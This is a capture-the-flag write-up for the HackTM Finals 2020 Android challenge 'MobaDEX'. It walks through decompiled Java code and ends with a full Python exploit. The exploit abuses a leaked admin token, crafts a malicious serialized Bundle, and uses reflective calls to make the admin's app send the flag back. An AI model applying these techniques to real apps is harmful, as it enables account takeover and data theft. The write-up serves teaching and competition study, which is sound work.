---
layout: post
title: "HackTM CTF Finals 2020 / MobaDEX"
permalink: /hacktm-finals-2020-mobadex
---

At first, I ran the apk inside an android emulator to play around a bit. Nothing fancy, you just register an account, login, add friends, send and receive messages.

First, I decided to check if there are things that we are not allowed to do and found the following:
```java
if (friend_username.equals("Admin_FeDEX")) {
    AddFriendFragment.this.updateTextView("Cannot add Admin!");
```
We have found the admin's username, but we are not allowed to add him. However, this check is case-sensitive. Even though, the real check happens in the remote server, I decided to take my chance and tried to add him as `Admin_FeDEx` instead which succeeded. In order to be sure that I added the correct user, I tried to send a message to `Admin_FeDEX` and it, again, succeeded.

Now that we found the admin's username, I decided to check how we send messages. The following function is called when we write a message and click on the send button:
```java
public int do_send_moba() {
    OkHttpClient client = new OkHttpClient();
    String friend_username = ((EditText) this.resources.findViewById(R.id.editTextTextPersonName4)).getText().toString();
    final String data = ((EditText) this.resources.findViewById(R.id.editTextTextPersonName3)).getText().toString();
    client.newCall(new Request.Builder().url("http://35.246.216.38:8686/api.php").post(new FormBody.Builder().add("q", "KVY2ERbWMEGBgob").add("token", this.sess.getToken()).add("friend_username", friend_username).build()).build()).enqueue(new Callback() {
        public void onFailure(Call call, IOException e) {
            Log.d("[MobaDEX]", "Error:" + e.toString());
            e.printStackTrace();
        }

        public void onResponse(Call call, Response response) throws IOException {
            if (response.isSuccessful()) {
                final String myResponse = response.body().string();
                WriteMobaFragment.this.getActivity().runOnUiThread(new Runnable() {
                    public void run() {
                        Log.d("[MobaDEX]", myResponse);
                        if (myResponse.equals("Failed to connect to MySQL: ") || myResponse.equals("Invalid Token.") || myResponse.equals("Invalid Username.") || myResponse.equals("Not a friend.") || myResponse.equals("Invalid Request.")) {
                            Log.d("[MobaDEX]", "ERROR!");
                            WriteMobaFragment.this.updateTextView("Error!");
                            return;
                        }
                        Log.d("[MobaDEX]", "Success!");
                        Intent intent_data = new Intent();
                        intent_data.putExtra("moba_display_content", data);
                        intent_data.putExtra("moba_display_package", BuildConfig.APPLICATION_ID);
                        intent_data.putExtra("moba_display_class", "com.example.mobadex.ui.main.ShowMoba");
                        Intent i = new Intent(WriteMobaFragment.this.accessible, SendMoba.class);
                        i.putExtra("moba_user_token", WriteMobaFragment.this.sess.getToken());
                        i.putExtra("moba_friend_token", myResponse);
                        i.putExtra("moba_data", intent_data);
                        WriteMobaFragment.this.startActivity(i);
                        WriteMobaFragment.this.updateTextView("Success!");
                    }
                });
                return;
            }
            Log.d("[MobaDEX]", "Seding Moba Failed!");
            WriteMobaFragment.this.updateTextView("Error!");
        }
    });
    return 0;
}
```

First thing to note here is that we have an api endpoint which gives us the friend's token. Since the admin is our friend, we can get his token now.

Other than that, it creates an intent, which is used to start `SendMoba` activity, with extended data. The extended data carries `moba_user_token`, `moba_friend_token`, and `moba_data`. The `moba_data` field carries another intent which stores our text in `moba_display_content` and it stores `com.example.mobadex.ui.main.ShowMoba` in `moba_display_class`. 

After checking what we have in `SendMoba` class, I noticed that it calls this function on creation:
```java
public int do_send_moba(String user_token, String friend_token, Intent intent_data) {
    OkHttpClient client = new OkHttpClient();
    Bundle data = intent_data.getExtras();
    display_bundle_extras(data);
    client.newCall(new Request.Builder().url("http://35.246.216.38:8686/api.php").post(new FormBody.Builder().add("q", "6xP0R1sioF5knfv").add("my_token", user_token).add("friend_token", friend_token).add("data", serialize_moba(data)).build()).build()).enqueue(new Callback() {
        public void onFailure(Call call, IOException e) {
            Log.d("MobaDEX", "Error:" + e.toString());
            e.printStackTrace();
        }

        public void onResponse(Call call, Response response) throws IOException {
            if (response.isSuccessful()) {
                final String myResponse = response.body().string();
                SendMoba.this.runOnUiThread(new Runnable() {
                    public void run() {
                        Log.d("[MobaDEX]", myResponse);
                        if (myResponse.equals("Failed to connect to MySQL: ") || myResponse.equals("Invalid Token.") || myResponse.equals("Invalid Username.") || myResponse.equals("Not a friend.") || myResponse.equals("Invalid Request.")) {
                            Log.d("[MobaDEX]", "ERROR!");
                        } else {
                            Log.d("[MobaDEX]", "Success!");
                        }
                    }
                });
                return;
            }
            Log.d("[MobaDEX]", "Seding Moba Failed!");
        }
    });
    return 0;
}
```

As we can see, the extended data is accessed as a bundle. It gets serialized and sent to the remote api as data.

Let's check the serialization and deserialization functions:
```java
private String serialize_moba(Bundle in) {
    Parcel parcel = Parcel.obtain();
    String serialized = null;
    try {
        in.writeToParcel(parcel, 0);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        IOUtils.write(parcel.marshall(), (OutputStream) bos);
        serialized = Base64.encodeToString(bos.toByteArray(), 0);
    } catch (IOException e) {
        Log.e(getClass().getSimpleName(), e.toString(), e);
    } catch (Throwable th) {
        parcel.recycle();
        throw th;
    }
    parcel.recycle();
    if (serialized == null) {
        return "";
    }
    Log.d("[MobaDEX]", serialized);
    return serialized;
}

private Bundle deserialize_moba(String serialized) {
    if (serialized == null) {
        return null;
    }
    Parcel parcel = Parcel.obtain();
    try {
        byte[] data = Base64.decode(serialized, 0);
        parcel.unmarshall(data, 0, data.length);
        parcel.setDataPosition(0);
        return parcel.readBundle();
    } finally {
        parcel.recycle();
    }
}
```

It simply puts the bundle inside a parcel, marshalls it and base64 encodes the raw byte array. The reverse operations are applied in deserialization.

Since there are no checks, we can control the bundle object that is deserialized.

My idea was to send the admin a malicious serialized object that can force him to send the flag back to me. But, where is the flag?
```sh
$ grep -r "HackTM{" MobaDEX
MobaDEX/res/values/strings.xml:    <string name="FLAG">HackTM{fake_flag}</string>
MobaDEX/smali_classes2/com/example/mobadex/ui/main/Session.smali:    const-string v0, "HackTM{local_flag}"
```

So, we have a flag inside the `Session` class:
```java
package com.example.mobadex.ui.main;

public class Session {
    private static Session instance = null;
    private String Flag = "HackTM{local_flag}";
    private String token = "";

    protected Session() {
    }

    public String getToken() {
        return this.token;
    }

    public String getFlag() {
        return this.Flag;
    }

    public void setToken(String token2) {
        this.token = token2;
    }

    public static Session getInstance() {
        if (instance == null) {
            instance = new Session();
        }
        return instance;
    }
}
```

Since we found where the flag is, let's check `ProcessMoba` class to find a way to steal the flag.
```java
public void onCreate(Bundle savedInstanceState) {
    String extra_data;
    super.onCreate(savedInstanceState);
    Log.d("[MobaDEX]", "Processing Moba...");
    this.sess = Session.getInstance();
    Intent i = getIntent();
    String moba_data = i.getStringExtra("moba_data");
    String moba_id = i.getStringExtra("moba_id");
    Bundle data = deserialize_moba(moba_data);
    String moba_class = data.getString("moba_display_class");
    String moba_package = data.getString("moba_display_package");
    String moba_content = data.getString("moba_display_content");
    Intent intent = new Intent();
    intent.setClassName(moba_package, moba_class);
    intent.putExtra("display_content", moba_content);
    intent.putExtra("display_id", moba_id);
    if (data.getString("moba_user_token") != null) {
        intent.putExtra("moba_user_token", data.getString("moba_user_token"));
    }
    if (data.getString("moba_friend_token") != null) {
        intent.putExtra("moba_friend_token", data.getString("moba_friend_token"));
    }
```

Bundle `data` is under our control. Note that, it creates a new intent with `data["moba_display_package"]` and `data["moba_display_class"]`. Also, if our bundle contains `moba_user_token` or `moba_friend_token`, they are copied into the new intent as well.

```java
if (data.getString("moba_data") != null) {
    try {
        String str = moba_data;
        String str2 = moba_id;
        try {
            extra_data = (String) this.sess.getClass().getMethod(data.getString("moba_data"), new Class[0]).invoke(this.sess, new Object[0]);
```

If our bundle contains a `moba_data` string, it is used as a method name to invoke a method from the session object, the result is stored in `extra_data` variable which means that we can set this field to `getFlag` to read the flag.

```java
    Intent tmp_bund22222222 = new Intent();
    tmp_bund22222222.putExtra("moba_display_content", extra_data);
    tmp_bund22222222.putExtra("moba_display_package", BuildConfig.APPLICATION_ID);
    tmp_bund22222222.putExtra("moba_display_class", "com.example.mobadex.ui.main.ShowMoba");
    intent.putExtra("moba_data", tmp_bund22222222);
} else {
    String str11 = moba_id;
}
startActivity(intent);
```

The flag will be converted to an intent and set as `moba_data` to the previously created intent, and the intent will passed to `startActivity` function.

Remember that we can control `moba_display_package` and `moba_display_class` which means we can set the activity that will be started. Also, if we put `moba_user_token` and `moba_friend_token` they will be carried to this intent as well.

Let's take a look at `onCreate` event handler of `SendMoba` class:
```java
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    Log.d("[MobaDEX]", "Sending Moba...");
    Bundle b = getIntent().getExtras();
    do_send_moba(b.getString("moba_user_token"), b.getString("moba_friend_token"), (Intent) b.getParcelable("moba_data"));
    finish();
}
```

If we set `moba_user_token` to admin's token, `moba_friend_token` to our token, and `moba_display_class` to `SendMoba`, the flag will be sent to us.

There is one issue though, the admin is unable to send us messages since we are not his friend. However, the add friend api endpoint just requires your token and the friend's username. Since we can get admin's token, we can add ourselves as his friend before sending our payload.

In order to craft the payload, I referred to my teammate [@NightShadow](https://twitter.com/NightShadowNSYY)'s [write-up](https://r3kapig.com/writeup/20200507-De1taCTF-BroadcastTest/)

Here is my final exploit:
```python
#!/usr/bin/env python3
from pwn import *
from base64 import b64encode
import requests


API_URL = 'http://35.246.216.38:8686/api.php'


def get_token(username, password):
    data = {
	'q': 'YOZ8AxBEUCgZEPG',
	'username': username,
        'password': password,
    }
    res = requests.post(url=API_URL, data=data)
    token = res.text
    return token


def get_friend_token(friend_name, token):
    data = {
        'q': 'KVY2ERbWMEGBgob', 
        'token': token,
        'friend_username': friend_name,
    }
    res = requests.post(url=API_URL, data=data)
    friend_token = res.text
    return friend_token


def send_moba(my_token, friend_token, data):
    data = {
        'q': '6xP0R1sioF5knfv', 
        'my_token': my_token,
        'friend_token': friend_token,
        'data': data,
    }
    res = requests.post(url=API_URL, data=data)


def add_friend(token, username):
    data = {
        'q': 'j0y2vm32GH6cfiP', 
        'token': token,
        'username': username,
    }
    res = requests.post(url=API_URL, data=data)


def create_payload(user_token, friend_token):
    p = bytearray()
    p += p32(0) # size
    p += b'BNDL' # bundle magic
    p += p32(6) # number of keys
    p += p32(len('moba_display_class')) # key length
    p += 'moba_display_class\x00'.encode('utf-16le') # key
    p += b'\x00' * (-len(p) % 4) # padding
    p += p32(0) # value type, 0 -> string
    p += p32(len('com.example.mobadex.SendMoba')) # value length
    p += 'com.example.mobadex.SendMoba\x00'.encode('utf-16le') # value
    p += b'\x00' * (-len(p) % 4) # padding

    p += p32(len('moba_display_content'))
    p += 'moba_display_content\x00'.encode('utf-16le')
    p += b'\x00' * (-len(p) % 4) # padding
    p += p32(0)
    p += p32(len('data'))
    p += 'data\x00'.encode('utf-16le')
    p += b'\x00' * (-len(p) % 4) # padding

    p += p32(len('moba_display_package'))
    p += 'moba_display_package\x00'.encode('utf-16le')
    p += b'\x00' * (-len(p) % 4) # padding
    p += p32(0)
    p += p32(len('com.example.mobadex'))
    p += 'com.example.mobadex\x00'.encode('utf-16le')  
    p += b'\x00' * (-len(p) % 4) # padding

    p += p32(len('moba_data'))
    p += 'moba_data\x00'.encode('utf-16le')
    p += b'\x00' * (-len(p) % 4) # padding
    p += p32(0)
    p += p32(len('getFlag'))
    p += 'getFlag\x00'.encode('utf-16le')  
    p += b'\x00' * (-len(p) % 4) # padding

    p += p32(len('moba_user_token'))
    p += 'moba_user_token\x00'.encode('utf-16le')
    p += b'\x00' * (-len(p) % 4) # padding
    p += p32(0)
    p += p32(len(user_token))
    p += f'{user_token}\x00'.encode('utf-16le')  
    p += b'\x00' * (-len(p) % 4) # padding

    p += p32(len('moba_friend_token'))
    p += 'moba_friend_token\x00'.encode('utf-16le')
    p += b'\x00' * (-len(p) % 4) # padding
    p += p32(0)
    p += p32(len(friend_token))
    p += f'{friend_token}\x00'.encode('utf-16le')  
    p += b'\x00' * (-len(p) % 4) # padding

    # fix the size
    p[0:4] = p32(len(p[8:]))
    return b64encode(p)


def main():
    token = get_token('umut','123456');
    add_friend(token, 'Admin_Fedex')
    friend_token = get_friend_token('Admin_FeDEX', token)
    add_friend(friend_token, 'umut')
    payload = create_payload(friend_token, token)
    send_moba(token, friend_token, payload)


if __name__ == '__main__':
    main()
```
